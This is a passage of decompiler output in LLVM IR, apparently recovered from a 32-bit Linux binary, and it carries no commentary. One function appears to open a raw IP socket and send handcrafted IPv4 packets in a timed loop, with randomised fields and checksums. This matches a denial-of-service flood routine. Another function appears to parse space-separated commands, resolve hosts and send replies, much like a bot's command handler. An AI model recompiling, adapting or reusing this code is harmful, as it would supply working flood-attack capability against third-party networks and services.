  %v2_8049a84 = call i32 @function_804b418(i32* null)
  store i32 %v2_8049a84, i32* @eax, align 4
  %v1_8049a95 = call i32 @function_8048309(i32 %arg3)
  %v1_8049a9d = icmp eq i32 %v1_8049a95, 0
  %v1_8049a9f = icmp eq i1 %v1_8049a9d, false
  br i1 %v1_8049a9f, label %dec_label_pc_8049db9, label %dec_label_pc_8049aa5

dec_label_pc_8049aa5:                             ; preds = %dec_label_pc_8049a6e
  %v4_8049aa5 = add i32 %arg4, -1
  %v9_8049aa5 = sub i32 0, %arg4
  %v10_8049aa5 = and i32 %arg4, %v9_8049aa5
  %v11_8049aa5 = icmp slt i32 %v10_8049aa5, 0
  %v12_8049aa5 = icmp eq i32 %v4_8049aa5, 0
  %v13_8049aa5 = icmp slt i32 %v4_8049aa5, 0
  %v3_8049aa9 = icmp eq i1 %v13_8049aa5, %v11_8049aa5
  %v4_8049aa9 = icmp eq i1 %v12_8049aa5, false
  %v5_8049aa9 = and i1 %v4_8049aa9, %v3_8049aa9
  br i1 %v5_8049aa9, label %dec_label_pc_8049acb, label %dec_label_pc_8049aab

dec_label_pc_8049aab:                             ; preds = %dec_label_pc_8049aa5
  %v3_8049ab9 = call i32 @function_80482b2(i32 %arg2, i32 ptrtoint ([36 x i8]* @global_var_8052430.54 to i32))
  store i32 %v3_8049ab9, i32* @eax, align 4
  %v1_8049ac6 = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_8049acb

dec_label_pc_8049acb:                             ; preds = %dec_label_pc_8049aa5, %dec_label_pc_8049aab
  %v1_8049ace = add i32 %arg5, 8
  %v1_8049ad1 = inttoptr i32 %v1_8049ace to i32*
  %v2_8049ad1 = load i32, i32* %v1_8049ad1, align 4
  %v1_8049ad7 = call i32 @function_804e73c(i32 %v2_8049ad1)
  %v4_8049aee = call i32 @function_804d6e8(i32 2, i32 3, i32 255)
  store i32 %v4_8049aee, i32* @eax, align 4
  %v5_8049af9 = icmp slt i32 %v4_8049aee, 0
  %v1_8049afd = icmp eq i1 %v5_8049af9, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b09, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049acb
  %v1_8049b04 = call i32 @function_804e884(i32 1)
  br label %dec_label_pc_8049b09

dec_label_pc_8049b09:                             ; preds = %dec_label_pc_8049acb, %dec_label_pc_8049aff
  %v2_8049b0e = call i32 @function_804b418(i32* null)
  store i32 %v2_8049b0e, i32* @ebx, align 4
  %v0_8049b18 = call i32 @function_804b314()
  %v1_8049b1d = load i32, i32* @ebx, align 4
  %v2_8049b1d = xor i32 %v1_8049b1d, %v0_8049b18
  store i32 %v2_8049b1d, i32* @eax, align 4
  %v1_8049b23 = call i32 @function_804e4bc(i32 %v2_8049b1d)
  store i32 %v1_8049b23, i32* @eax, align 4
  %v1_8049b2b = call i32 @function_804e3b8(i32 %v2_8049b1d)
  %v2_8049b37 = ptrtoint i8* %stack_var_-100 to i32
  %v15_8049b3a = ptrtoint i32* %stack_var_-60 to i32
  %v4_8049b3e = bitcast i32* %stack_var_-60 to i8*
  %v5_8049b3e = call i32 @function_804ce60(i8* %v4_8049b3e, i32 %v1_8049b2b, i32 1400)
  %v1_8049b49 = add i32 %arg5, 4
  %v1_8049b4c = inttoptr i32 %v1_8049b49 to i32*
  %v2_8049b4c = load i32, i32* %v1_8049b4c, align 4
  %v3_8049b55 = call i32 @function_804939b(i32 %arg3, i32 %v2_8049b4c)
  %v3_8049b74 = call i32 @function_80482b2(i32 %arg2, i32 ptrtoint ([36 x i8]* @global_var_8052454.55 to i32))
  %v2_8049cf8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_8049cfe = ptrtoint i32* %stack_var_-140 to i32
  %v15_8049d04 = ptrtoint i16* %stack_var_-80 to i32
  %v12_8049d22 = ptrtoint i32* %stack_var_-120 to i32
  %v2_8049d4f = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049d8b = add i32 %v1_8049ad7, %v2_8049a84
  br label %dec_label_pc_8049b7c

dec_label_pc_8049b7c:                             ; preds = %dec_label_pc_8049d99, %dec_label_pc_8049b09
  %stack_var_-32.0 = phi i32 [ %tmp58, %dec_label_pc_8049b09 ], [ %v4_8049d99, %dec_label_pc_8049d99 ]
  %v0_8049b7c = call i32 @function_80483e8()
  store i8 69, i8* %stack_var_-100, align 1
  %v0_8049bab = load i32, i32* @esp, align 4
  %v2_8049bae = add i32 %v0_8049bab, -16
  %v3_8049bae = inttoptr i32 %v2_8049bae to i32*
  store i32 1440, i32* %v3_8049bae, align 4
  %v2_8049baf = call i32 @function_804d0f8(i32 69)
  store i32 %v2_8049baf, i32* @eax, align 4
  %sext11 = mul i32 %v2_8049baf, 65536
  %v1_8049bbb = sdiv i32 %sext11, 65536
  %v2_8049bbb = call i32 @function_804e3b8(i32 %v1_8049bbb)
  store i32 %v3_8049b55, i32* @eax, align 4
  %sext12 = mul i32 %v2_8049bbb, 65536
  %v1_8049be4 = sdiv i32 %sext12, 65536
  %v2_8049be4 = call i32 @function_804e3b8(i32 %v1_8049be4)
  %v3_8049be4 = trunc i32 %v2_8049be4 to i16
  store i32 %v2_8049be4, i32* @eax, align 4
  store i16 %v3_8049be4, i16* %stack_var_-80, align 2
  %sext9 = mul i32 %v2_8049be4, 65536
  %v1_8049bed = sdiv i32 %sext9, 65536
  %v2_8049bed = call i32 @function_804e3b8(i32 %v1_8049bed)
  store i32 %v2_8049bed, i32* @eax, align 4
  %sext10 = mul i32 %v2_8049bed, 65536
  %v1_8049bf6 = sdiv i32 %sext10, 65536
  %v2_8049bf6 = call i32 @function_804e3b8(i32 %v1_8049bf6)
  store i32 %v2_8049bf6, i32* @eax, align 4
  %v1_8049bfe = call i32 @function_804e3b8(i32 %v2_8049bf6)
  store i32 2, i32* %stack_var_-168, align 4
  %v0_8049c95 = load i32, i32* @esp, align 4
  %v1_8049c95 = add i32 %v0_8049c95, -4
  %v2_8049c95 = inttoptr i32 %v1_8049c95 to i32*
  store i32 20, i32* %v2_8049c95, align 4
  %v2_8049c97 = add i32 %v0_8049c95, -8
  %v3_8049c97 = inttoptr i32 %v2_8049c97 to i32*
  store i32 %v2_8049b37, i32* %v3_8049c97, align 4
  %v0_8049c98 = load i32, i32* %stack_var_-168, align 4
  %v3_8049c98 = inttoptr i32 %v0_8049c98 to i16*
  %v4_8049c98 = call i32 @function_80488bc(i16* %v3_8049c98, i32 %v1_8049bf6)
  %v0_8049c9d = load i32, i32* @esp, align 4
  %v1_8049ca7 = add i32 %v0_8049c9d, 4
  %v2_8049ca7 = inttoptr i32 %v1_8049ca7 to i32*
  store i32 40, i32* %v2_8049ca7, align 4
  %v3_8049ca9 = inttoptr i32 %v0_8049c9d to i32*
  store i32 %v2_8049b37, i32* %v3_8049ca9, align 4
  %sext15 = mul i32 %v4_8049c98, 65536
  %v1_8049caa = sdiv i32 %sext15, 65536
  %v3_8049caa = inttoptr i32 %v1_8049caa to i16*
  %v4_8049caa = call i32 @function_80488bc(i16* %v3_8049caa, i32 ptrtoint (i32* @0 to i32))
  %v0_8049caf = load i32, i32* @esp, align 4
  store i32 %v0_8049b7c, i32* %stack_var_-152, align 4
  %v2_8049ce8 = add i32 %v0_8049caf, -8
  %v3_8049ce8 = inttoptr i32 %v2_8049ce8 to i32*
  store i32 1420, i32* %v3_8049ce8, align 4
  %v0_8049ce9 = load i32, i32* %stack_var_-152, align 4
  %v1_8049ce9 = call i32 @function_804d0f8(i32 %v0_8049ce9)
  %v0_8049cee = load i32, i32* @esp, align 4
  store i32 %v2_8049cfe, i32* %edx.global-to-local, align 4
  %v1_8049d0a = add i32 %v0_8049cee, 8
  %v2_8049d0a = inttoptr i32 %v1_8049d0a to i32*
  store i32 20, i32* %v2_8049d0a, align 4
  %v2_8049d0c = add i32 %v0_8049cee, 4
  %v3_8049d0c = inttoptr i32 %v2_8049d0c to i32*
  store i32 %v2_8049cfe, i32* %v3_8049d0c, align 4
  %v3_8049d0d = inttoptr i32 %v0_8049cee to i32*
  store i32 %v15_8049d04, i32* %v3_8049d0d, align 4
  %sext16 = mul i32 %v1_8049ce9, 65536
  %v1_8049d0e = sdiv i32 %sext16, 65536
  %v4_8049d0e = call i32 @function_804cfc4(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d13 = load i32, i32* @esp, align 4
  %v5_8049d19 = add i32 %v0_8049d13, 8
  %v6_8049d19 = inttoptr i32 %v5_8049d19 to i32*
  store i32 1400, i32* %v6_8049d19, align 4
  %v2_8049d25 = add i32 %v0_8049d13, 4
  %v3_8049d25 = inttoptr i32 %v2_8049d25 to i32*
  store i32 %v12_8049d22, i32* %v3_8049d25, align 4
  %v3_8049d2c = inttoptr i32 %v0_8049d13 to i32*
  store i32 %v15_8049b3a, i32* %v3_8049d2c, align 4
  %v4_8049d2d = call i32 @function_804cfc4(i32 %v1_8049d0e, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049d32 = load i32, i32* @esp, align 4
  store i32 %v2_8049cf8, i32* %edx.global-to-local, align 4
  %v2_8049d41 = add i32 %v0_8049d32, 12
  %v3_8049d41 = inttoptr i32 %v2_8049d41 to i32*
  store i32 1432, i32* %v3_8049d41, align 4
  %v2_8049d42 = add i32 %v0_8049d32, 8
  %v3_8049d42 = inttoptr i32 %v2_8049d42 to i32*
  store i32 %v2_8049cf8, i32* %v3_8049d42, align 4
  %v3_8049d43 = inttoptr i32 %v1_8049d0e to i16*
  %v4_8049d43 = call i32 @function_80488bc(i16* %v3_8049d43, i32 ptrtoint (i32* @0 to i32))
  %v0_8049d48 = load i32, i32* @esp, align 4
  store i32 1440, i32* %edx.global-to-local, align 4
  %v1_8049d5e = add i32 %v0_8049d48, -4
  %v2_8049d5e = inttoptr i32 %v1_8049d5e to i32*
  store i32 16, i32* %v2_8049d5e, align 4
  %v2_8049d60 = add i32 %v0_8049d48, -8
  %v3_8049d60 = inttoptr i32 %v2_8049d60 to i32*
  store i32 %v2_8049d4f, i32* %v3_8049d60, align 4
  %v1_8049d61 = add i32 %v0_8049d48, -12
  %v2_8049d61 = inttoptr i32 %v1_8049d61 to i32*
  store i32 0, i32* %v2_8049d61, align 4
  %v0_8049d63 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049d63 = add i32 %v0_8049d48, -16
  %v3_8049d63 = inttoptr i32 %v2_8049d63 to i32*
  store i32 %v0_8049d63, i32* %v3_8049d63, align 4
  %v2_8049d67 = add i32 %v0_8049d48, -20
  %v3_8049d67 = inttoptr i32 %v2_8049d67 to i32*
  store i32 %v2_8049b37, i32* %v3_8049d67, align 4
  %v5_8049d68 = add i32 %v0_8049d48, -24
  %v6_8049d68 = inttoptr i32 %v5_8049d68 to i32*
  store i32 %v4_8049aee, i32* %v6_8049d68, align 4
  %v1_8049d6b = load i32, i32* %stack_var_-60, align 4
  %sext19 = mul i32 %v4_8049d43, 65536
  %v2_8049d6b = sdiv i32 %sext19, 65536
  %v7_8049d6b = call i32 @function_804d668(i32 %v2_8049d6b, i32 %v1_8049d6b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %tmp82 = icmp ult i32 %stack_var_-32.0, 50
  br i1 %tmp82, label %dec_label_pc_8049d99, label %dec_label_pc_8049d79

dec_label_pc_8049d79:                             ; preds = %dec_label_pc_8049b7c
  %v0_8049d70 = load i32, i32* @esp, align 4
  %v1_8049d7c = add i32 %v0_8049d70, 16
  %v2_8049d7c = inttoptr i32 %v1_8049d7c to i32*
  store i32 0, i32* %v2_8049d7c, align 4
  %v2_8049d7e = inttoptr i32 %v2_8049d6b to i32*
  %v3_8049d7e = call i32 @function_804b418(i32* %v2_8049d7e)
  %v0_8049d83 = load i32, i32* @esp, align 4
  store i32 %v3_8049d7e, i32* %edx.global-to-local, align 4
  %v7_8049d8e = icmp ult i32 %v3_8049d7e, %v5_8049d8b
  %v1_8049d90 = icmp eq i1 %v7_8049d8e, false
  br i1 %v1_8049d90, label %dec_label_pc_8049da1, label %dec_label_pc_8049d99

dec_label_pc_8049d99:                             ; preds = %dec_label_pc_8049d79, %dec_label_pc_8049b7c
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.0, %dec_label_pc_8049b7c ], [ 0, %dec_label_pc_8049d79 ]
  %v4_8049d99 = add i32 %stack_var_-32.1, 1
  br label %dec_label_pc_8049b7c

dec_label_pc_8049da1:                             ; preds = %dec_label_pc_8049d79
  %v6_8049da4 = inttoptr i32 %v0_8049d83 to i32*
  store i32 %v4_8049aee, i32* %v6_8049da4, align 4
  %v1_8049da7 = call i32 @function_804b2bc(i32 %stack_var_-32.0)
  store i32 %v1_8049da7, i32* @eax, align 4
  %v0_8049dac = load i32, i32* @esp, align 4
  %v2_8049db2 = inttoptr i32 %v0_8049dac to i32*
  store i32 0, i32* %v2_8049db2, align 4
  %v1_8049db4 = call i32 @function_804e884(i32 %stack_var_-32.0)
  br label %dec_label_pc_8049db9

dec_label_pc_8049db9:                             ; preds = %dec_label_pc_8049a6e, %dec_label_pc_8049da1
  %v0_8049dbd = phi i32 [ %v1_8049a95, %dec_label_pc_8049a6e ], [ %v1_8049db4, %dec_label_pc_8049da1 ]
  ret i32 %v0_8049dbd

; uselistorder directives
  uselistorder i32 %v2_8049d6b, { 1, 0 }
  uselistorder i32 %v0_8049d13, { 1, 0, 2 }
  uselistorder i32 %v1_8049d0e, { 2, 1, 0 }
  uselistorder i32 %v0_8049cee, { 2, 0, 1 }
  uselistorder i32 %v1_8049bf6, { 1, 0 }
  uselistorder i32 %v2_8049be4, { 0, 2, 1 }
  uselistorder i32 %stack_var_-32.0, { 0, 1, 3, 2 }
  uselistorder i32 %v4_8049aa5, { 1, 0 }
  uselistorder i8* %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i16* %stack_var_-80, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_804d668, { 2, 1, 0 }
  uselistorder i32 1440, { 1, 0 }
  uselistorder i8 69, { 1, 2, 0 }
  uselistorder i32 ()* @function_80483e8, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_804939b, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0 }
  uselistorder i32 (i32)* @function_804e73c, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_8048309, { 3, 2, 1, 0 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049db9, { 1, 0 }
  uselistorder label %dec_label_pc_8049b09, { 1, 0 }
  uselistorder label %dec_label_pc_8049acb, { 1, 0 }
}

define i32 @function_804a7e3(i32 %arg1) local_unnamed_addr {
dec_label_pc_804a7e3:
  %v3_804a7fa = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_8052c0d.90 to i32))
  %v3_804a817 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([13 x i8]* @global_var_8052c1a.92 to i32))
  %v3_804a830 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([8 x i8]* @global_var_8052c27.93 to i32))
  ret i32 %v3_804a830

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @function_804a83a(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804a83a:
  %v3_804a84e = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([9 x i8]* @global_var_8052c2f.94 to i32))
  ret i32 %v3_804a84e
}

define i32 @function_804a858(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804a858:
  %stack_var_-32 = alloca i8, align 1
  br label %dec_label_pc_804a87c.preheader

dec_label_pc_804a876:                             ; preds = %dec_label_pc_804a89b
  %v5_804a876 = add i32 %.pre34, 1
  %v22_804a876 = inttoptr i32 %v5_804a876 to i8*
  %v4_804a879 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_804a87c

dec_label_pc_804a87c:                             ; preds = %dec_label_pc_804a87c.preheader, %dec_label_pc_804a876
  %stack_var_-28.0 = phi i32 [ %v4_804a879, %dec_label_pc_804a876 ], [ %stack_var_-28.167, %dec_label_pc_804a87c.preheader ]
  %stack_var_-20.0 = phi i8* [ %v22_804a876, %dec_label_pc_804a876 ], [ %stack_var_-20.168, %dec_label_pc_804a87c.preheader ]
  %v3_804a890 = call i32 @_strlen(i8* %arg2)
  %v7_804a897 = icmp ult i32 %stack_var_-28.0, %v3_804a890
  %v1_804a899 = icmp eq i1 %v7_804a897, false
  %.pre34 = ptrtoint i8* %stack_var_-20.0 to i32
  br i1 %v1_804a899, label %dec_label_pc_804a8a4, label %dec_label_pc_804a89b

dec_label_pc_804a89b:                             ; preds = %dec_label_pc_804a87c
  %v2_804a89e = load i8, i8* %stack_var_-20.0, align 1
  %v7_804a8a0 = icmp eq i8 %v2_804a89e, 32
  %v1_804a8a2 = icmp eq i1 %v7_804a8a0, false
  br i1 %v1_804a8a2, label %dec_label_pc_804a876, label %dec_label_pc_804a8a4

dec_label_pc_804a8a4:                             ; preds = %dec_label_pc_804a87c, %dec_label_pc_804a89b
  %v5_804a8a4 = add i32 %.pre34, 1
  %v3_804a8bb = call i32 @_strlen(i8* %arg2)
  %v12_804a8c2 = icmp eq i32 %stack_var_-28.0, %v3_804a8bb
  br i1 %v12_804a8c2, label %dec_label_pc_804aa97, label %dec_label_pc_804a8ca

dec_label_pc_804a8ca:                             ; preds = %dec_label_pc_804a8a4
  %v22_804a8a4 = inttoptr i32 %v5_804a8a4 to i8*
  %v4_804a8ca = add nuw nsw i32 %storemerge969, 1
  %v7_804a8d1 = icmp sgt i32 %storemerge969, 3
  br i1 %v7_804a8d1, label %dec_label_pc_804a8df.preheader, label %dec_label_pc_804a87c.preheader

dec_label_pc_804a87c.preheader:                   ; preds = %dec_label_pc_804a858, %dec_label_pc_804a8ca
  %storemerge969 = phi i32 [ 0, %dec_label_pc_804a858 ], [ %v4_804a8ca, %dec_label_pc_804a8ca ]
  %stack_var_-20.168 = phi i8* [ %arg2, %dec_label_pc_804a858 ], [ %v22_804a8a4, %dec_label_pc_804a8ca ]
  %stack_var_-28.167 = phi i32 [ 0, %dec_label_pc_804a858 ], [ %stack_var_-28.0, %dec_label_pc_804a8ca ]
  br label %dec_label_pc_804a87c

dec_label_pc_804a8df.preheader:                   ; preds = %dec_label_pc_804a8ca
  br label %dec_label_pc_804a8df

dec_label_pc_804a8dc:                             ; preds = %dec_label_pc_804a8fe
  %v4_804a8dc = add i32 %storemerge8, 1
  br label %dec_label_pc_804a8df

dec_label_pc_804a8df:                             ; preds = %dec_label_pc_804a8df.preheader, %dec_label_pc_804a8dc
  %storemerge8 = phi i32 [ %v4_804a8dc, %dec_label_pc_804a8dc ], [ 0, %dec_label_pc_804a8df.preheader ]
  %v3_804a8f3 = call i32 @_strlen(i8* %v22_804a8a4)
  %v7_804a8fa = icmp ult i32 %storemerge8, %v3_804a8f3
  %v1_804a8fc = icmp eq i1 %v7_804a8fa, false
  %.pre = add i32 %storemerge8, %v5_804a8a4
  br i1 %v1_804a8fc, label %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge, label %dec_label_pc_804a8fe

dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge: ; preds = %dec_label_pc_804a8df
  %.pre23 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_804a90a

dec_label_pc_804a8fe:                             ; preds = %dec_label_pc_804a8df
  %v1_804a904 = inttoptr i32 %.pre to i8*
  %v2_804a904 = load i8, i8* %v1_804a904, align 1
  %v7_804a906 = icmp eq i8 %v2_804a904, 32
  %v1_804a908 = icmp eq i1 %v7_804a906, false
  br i1 %v1_804a908, label %dec_label_pc_804a8dc, label %dec_label_pc_804a90a

dec_label_pc_804a90a:                             ; preds = %dec_label_pc_804a8fe, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge
  %v1_804a910.pre-phi = phi i8* [ %.pre23, %dec_label_pc_804a8df.dec_label_pc_804a90a_crit_edge ], [ %v1_804a904, %dec_label_pc_804a8fe ]
  store i8 0, i8* %v1_804a910.pre-phi, align 1
  %v0_804a913 = load i32, i32* @global_var_8058204.80, align 4
  %v3_804a91f = call i32 @function_804cfdc(i8* %v22_804a8a4, i32 %v0_804a913)
  %v1_804a927 = icmp eq i32 %v3_804a91f, 0
  %v1_804a929 = icmp eq i1 %v1_804a927, false
  br i1 %v1_804a929, label %dec_label_pc_804aa97, label %dec_label_pc_804a92f

dec_label_pc_804a92f:                             ; preds = %dec_label_pc_804a90a
  %v0_804a92f = load i64, i64* @global_var_8055a4c.12, align 8
  %v1_804a92f = trunc i64 %v0_804a92f to i32
  %v1_804a934 = icmp eq i32 %v1_804a92f, 0
  %v1_804a936 = icmp eq i1 %v1_804a934, false
  br i1 %v1_804a936, label %dec_label_pc_804aa97, label %dec_label_pc_804a93c

dec_label_pc_804a93c:                             ; preds = %dec_label_pc_804a92f
  br label %dec_label_pc_804a958.preheader

dec_label_pc_804a952:                             ; preds = %dec_label_pc_804a977
  %v5_804a952 = add i32 %.pre33, 1
  %v22_804a952 = inttoptr i32 %v5_804a952 to i8*
  %v4_804a955 = add i32 %stack_var_-28.2, 1
  br label %dec_label_pc_804a958

dec_label_pc_804a958:                             ; preds = %dec_label_pc_804a958.preheader, %dec_label_pc_804a952
  %stack_var_-28.2 = phi i32 [ %v4_804a955, %dec_label_pc_804a952 ], [ %stack_var_-28.364, %dec_label_pc_804a958.preheader ]
  %stack_var_-20.2 = phi i8* [ %v22_804a952, %dec_label_pc_804a952 ], [ %stack_var_-20.365, %dec_label_pc_804a958.preheader ]
  %v3_804a96c = call i32 @_strlen(i8* %arg2)
  %v7_804a973 = icmp ult i32 %stack_var_-28.2, %v3_804a96c
  %v1_804a975 = icmp eq i1 %v7_804a973, false
  %.pre33 = ptrtoint i8* %stack_var_-20.2 to i32
  br i1 %v1_804a975, label %dec_label_pc_804a980, label %dec_label_pc_804a977

dec_label_pc_804a977:                             ; preds = %dec_label_pc_804a958
  %v2_804a97a = load i8, i8* %stack_var_-20.2, align 1
  %v7_804a97c = icmp eq i8 %v2_804a97a, 32
  %v1_804a97e = icmp eq i1 %v7_804a97c, false
  br i1 %v1_804a97e, label %dec_label_pc_804a952, label %dec_label_pc_804a980

dec_label_pc_804a980:                             ; preds = %dec_label_pc_804a958, %dec_label_pc_804a977
  %v5_804a980 = add i32 %.pre33, 1
  %v3_804a997 = call i32 @_strlen(i8* %arg2)
  %v12_804a99e = icmp eq i32 %stack_var_-28.2, %v3_804a997
  br i1 %v12_804a99e, label %dec_label_pc_804aa97, label %dec_label_pc_804a9a6

dec_label_pc_804a9a6:                             ; preds = %dec_label_pc_804a980
  %v22_804a980 = inttoptr i32 %v5_804a980 to i8*
  %v4_804a9a6 = add nuw nsw i32 %storemerge766, 1
  %v7_804a9ad = icmp sgt i32 %storemerge766, 1
  br i1 %v7_804a9ad, label %dec_label_pc_804a9bb.preheader, label %dec_label_pc_804a958.preheader

dec_label_pc_804a958.preheader:                   ; preds = %dec_label_pc_804a93c, %dec_label_pc_804a9a6
  %storemerge766 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %v4_804a9a6, %dec_label_pc_804a9a6 ]
  %stack_var_-20.365 = phi i8* [ %arg2, %dec_label_pc_804a93c ], [ %v22_804a980, %dec_label_pc_804a9a6 ]
  %stack_var_-28.364 = phi i32 [ 0, %dec_label_pc_804a93c ], [ %stack_var_-28.2, %dec_label_pc_804a9a6 ]
  br label %dec_label_pc_804a958

dec_label_pc_804a9bb.preheader:                   ; preds = %dec_label_pc_804a9a6
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9b8:                             ; preds = %dec_label_pc_804a9da
  %v4_804a9b8 = add i32 %storemerge, 1
  br label %dec_label_pc_804a9bb

dec_label_pc_804a9bb:                             ; preds = %dec_label_pc_804a9bb.preheader, %dec_label_pc_804a9b8
  %storemerge = phi i32 [ %v4_804a9b8, %dec_label_pc_804a9b8 ], [ 0, %dec_label_pc_804a9bb.preheader ]
  store i32 %storemerge, i32* @edx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_804a980, i32* @edi, align 4
  %v3_804a9cf = call i32 @_strlen(i8* %v22_804a980)
  %v0_804a9d6 = load i32, i32* @edx, align 4
  %v7_804a9d6 = icmp ult i32 %v0_804a9d6, %v3_804a9cf
  %v1_804a9d8 = icmp eq i1 %v7_804a9d6, false
  %.pre24 = add i32 %storemerge, %v5_804a980
  br i1 %v1_804a9d8, label %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge, label %dec_label_pc_804a9da

dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge: ; preds = %dec_label_pc_804a9bb
  %.pre31 = inttoptr i32 %.pre24 to i8*
  br label %dec_label_pc_804a9e6

dec_label_pc_804a9da:                             ; preds = %dec_label_pc_804a9bb
  %v1_804a9e0 = inttoptr i32 %.pre24 to i8*
  %v2_804a9e0 = load i8, i8* %v1_804a9e0, align 1
  %v7_804a9e2 = icmp eq i8 %v2_804a9e0, 32
  %v1_804a9e4 = icmp eq i1 %v7_804a9e2, false
  br i1 %v1_804a9e4, label %dec_label_pc_804a9b8, label %dec_label_pc_804a9e6

dec_label_pc_804a9e6:                             ; preds = %dec_label_pc_804a9da, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge
  %v1_804a9ec.pre-phi = phi i8* [ %.pre31, %dec_label_pc_804a9bb.dec_label_pc_804a9e6_crit_edge ], [ %v1_804a9e0, %dec_label_pc_804a9da ]
  store i8 0, i8* %v1_804a9ec.pre-phi, align 1
  %v1_804a9f5 = call i32 @function_804d200(i32 %v5_804a980)
  %v2_804a9f5 = trunc i32 %v1_804a9f5 to i8
  store i8 %v2_804a9f5, i8* %stack_var_-32, align 1
  %sext = mul i32 %v1_804a9f5, 16777216
  %tmp = icmp eq i32 %sext, -16777216
  %v1_804aa06 = icmp eq i1 %tmp, false
  br i1 %v1_804aa06, label %dec_label_pc_804a9e6._crit_edge, label %dec_label_pc_804aa08

dec_label_pc_804a9e6._crit_edge:                  ; preds = %dec_label_pc_804a9e6
  br label %bb

dec_label_pc_804aa08:                             ; preds = %dec_label_pc_804a9e6
  %v1_804aa0e = call i32 @function_804d228(i32 %v5_804a980)
  %v4_804aa19 = icmp eq i32 %v1_804aa0e, 0
  %v1_804aa1d = icmp eq i1 %v4_804aa19, false
  br i1 %v1_804aa1d, label %dec_label_pc_804aa3a, label %dec_label_pc_804aa1f

dec_label_pc_804aa1f:                             ; preds = %dec_label_pc_804aa08
  %v2_804aa30 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_8052c38.95 to i32))
  br label %dec_label_pc_804aa97

dec_label_pc_804aa3a:                             ; preds = %dec_label_pc_804aa08
  %v1_804aa3d = add i32 %v1_804aa0e, 12
  %v2_804aa3d = inttoptr i32 %v1_804aa3d to i32*
  %v3_804aa3d = load i32, i32* %v2_804aa3d, align 4
  %v1_804aa45 = add i32 %v1_804aa0e, 16
  %v2_804aa45 = inttoptr i32 %v1_804aa45 to i32*
  %v3_804aa45 = load i32, i32* %v2_804aa45, align 4
  %v1_804aa48 = inttoptr i32 %v3_804aa45 to i32*
  %v2_804aa48 = load i32, i32* %v1_804aa48, align 4
  %v1_804aa4f = inttoptr i32 %v2_804aa48 to i8*
  %v7_804aa52 = call i8* @_memcpy(i8* nonnull %stack_var_-32, i8* %v1_804aa4f, i32 %v3_804aa3d)
  %v2_804aa5f.pre = load i8, i8* %stack_var_-32, align 1
  br label %bb

bb:                                               ; preds = %dec_label_pc_804a9e6._crit_edge, %dec_label_pc_804aa3a
  %v2_804aa5f = phi i8 [ %v2_804a9f5, %dec_label_pc_804a9e6._crit_edge ], [ %v2_804aa5f.pre, %dec_label_pc_804aa3a ]
  store i8 %v2_804aa5f, i8* bitcast (i8** @global_var_8055a4b.96 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_8055a48.11 to i8*), align 4
  store i64 256, i64* @global_var_8055a4c.12, align 8
  br label %dec_label_pc_804aa97

dec_label_pc_804aa97:                             ; preds = %dec_label_pc_804a8a4, %dec_label_pc_804a980, %dec_label_pc_804a92f, %dec_label_pc_804a90a, %dec_label_pc_804aa1f, %bb
  %v0_804aa9d = phi i32 [ %v1_804a92f, %dec_label_pc_804a92f ], [ %v3_804a91f, %dec_label_pc_804a90a ], [ %v2_804aa30, %dec_label_pc_804aa1f ], [ ptrtoint (i8** @global_var_8055a48.11 to i32), %bb ], [ %v3_804a997, %dec_label_pc_804a980 ], [ %v3_804a8bb, %dec_label_pc_804a8a4 ]
  ret i32 %v0_804aa9d

; uselistorder directives
  uselistorder i32 %.pre24, { 1, 0 }
  uselistorder i32 %storemerge, { 0, 2, 1 }
  uselistorder i32 %storemerge766, { 1, 0 }
  uselistorder i32 %v3_804a997, { 1, 0 }
  uselistorder i32 %v5_804a980, { 1, 2, 0, 3, 4 }
  uselistorder i8* %stack_var_-20.2, { 1, 0 }
  uselistorder i32 %stack_var_-28.2, { 2, 0, 1, 3 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0, 2 }
  uselistorder i32 %storemerge969, { 1, 0 }
  uselistorder i32 %v3_804a8bb, { 1, 0 }
  uselistorder i8* %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %stack_var_-28.0, { 2, 0, 1, 3 }
